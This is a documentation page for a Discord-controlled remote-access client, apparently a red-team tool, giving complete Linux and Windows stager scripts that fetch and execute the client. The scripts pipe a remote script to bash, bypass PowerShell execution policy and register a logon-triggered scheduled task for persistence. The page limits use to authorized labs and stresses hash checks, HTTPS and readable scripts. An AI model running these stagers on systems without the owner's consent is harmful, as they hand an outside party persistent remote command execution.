# Stager (bootstrap installer)

> **Authorized hosts only.** A stager downloads and executes the client on a
> machine. Use it only on systems you own or have written permission to test.
> Do not use it to access third-party systems.

## 1. What a stager means here

There is no exploit or exploit chain in this project. A "stager" is simply a
small bootstrap that:

1. downloads the built client,
2. verifies its SHA-256,
3. installs it with a `.env`,
4. starts it.

This is the same as [`INSTALL.md`](./INSTALL.md), automated for a lab or a fleet
of your own machines. Prefer a configuration-management tool (Ansible, Intune,
SSH) when you have one.

## 2. Choose how config travels

| Mode | Build | Trade-off |
|---|---|---|
| Sidecar `.env` | `scripts/build.sh` | Token stays out of the binary; stager must deliver the file. |
| Embedded `.env` | `EMBED_ENV=1 scripts/build.sh` | Single file; the token is extractable from the artifact. |

For anything shared or stored, use the sidecar and deliver `.env` over a
protected channel. Rotate the token if an embedded artifact leaks.

## 3. Build and publish

```bash
scripts/build.sh linux
cat dist/SHA256SUMS
```

Serve the artifact from a host you control (lab example):

```bash
cd dist
python3 -m http.server 8088 --bind 0.0.0.0
```

Use HTTPS in any environment that is not an isolated lab. Record the hash:

```bash
sha256sum dist/dc2-linux-amd64
```

## 4. Linux stager

Save as `stager-linux.sh`, edit `BASE_URL`, `SHA256`, and `ENV_URL`:

```bash
#!/usr/bin/env bash
set -euo pipefail

BASE_URL="http://192.0.2.10:8088"
SHA256="<sha256-of-dc2-linux-amd64>"
ENV_URL="${BASE_URL}/.env"
WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT

curl -fsSL "${BASE_URL}/dc2-linux-amd64" -o "$WORK/dc2-client"
echo "${SHA256}  ${WORK}/dc2-client" | sha256sum -c -
curl -fsSL "$ENV_URL" -o "$WORK/.env"
chmod 700 "$WORK/dc2-client"
chmod 600 "$WORK/.env"

install -m 0755 "$WORK/dc2-client" "$HOME/.local/bin/dc2-client"
mkdir -p "$HOME/.config/dc2"
install -m 0600 "$WORK/.env" "$HOME/.config/dc2/.env"

cd "$HOME/.config/dc2"
exec "$HOME/.local/bin/dc2-client"
```

Run it:

```bash
curl -fsSL http://192.0.2.10:8088/stager-linux.sh | bash
```

Piping to `bash` is convenient and opaque. For anything beyond a lab, download
the script, read it, then run it.

## 5. Windows stager

Save as `stager-windows.ps1` and run in an elevated PowerShell:

```powershell
$ErrorActionPreference = "Stop"
$base = "http://192.0.2.10:8088"
$expected = "<sha256-of-dc2-windows-amd64.exe>"
$dir = "$env:ProgramData\D-C2"

New-Item -ItemType Directory -Force -Path $dir | Out-Null
Invoke-WebRequest "$base/dc2-windows-amd64.exe" -OutFile "$dir\dc2-client.exe"
Invoke-WebRequest "$base/.env" -OutFile "$dir\.env"

$actual = (Get-FileHash "$dir\dc2-client.exe" -Algorithm SHA256).Hash.ToLower()
if ($actual -ne $expected.ToLower()) { throw "hash mismatch" }

icacls "$dir\.env" /inheritance:r /grant:r "Administrators:F" "SYSTEM:F" | Out-Null

$action = New-ScheduledTaskAction -Execute "$dir\dc2-client.exe" -WorkingDirectory $dir
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -RunLevel Highest
Register-ScheduledTask -TaskName "D-C2" -Action $action -Trigger $trigger -Principal $principal -Force
```

Run once:

```powershell
powershell -ExecutionPolicy Bypass -File .\stager-windows.ps1
```

## 6. Verify the install

- Process is running (`systemctl status dc2`, Task Manager, or `ps`).
- Discord shows the new device channel and pinned banner.
- `/cmd command:"id"` (or `/fs cwd`) returns output.
- `journalctl -u dc2` / `Get-ScheduledTaskInfo D-C2` shows no restart loop.

## 7. Security rules for stagers

- Serve over HTTPS outside an isolated lab, or copy the file over SSH.
- Always verify a SHA-256 before executing.
- Never put the bot token in a stager script; deliver `.env` separately or embed
  it in the binary knowingly.
- Do not add obfuscation, encoded blobs, or hidden execution. They make review
  and cleanup harder and are unnecessary for an authorized lab.
- Keep the stager readable so the target owner can audit it.
- Clean up (`INSTALL.md` §7) and rotate the token when the exercise ends.
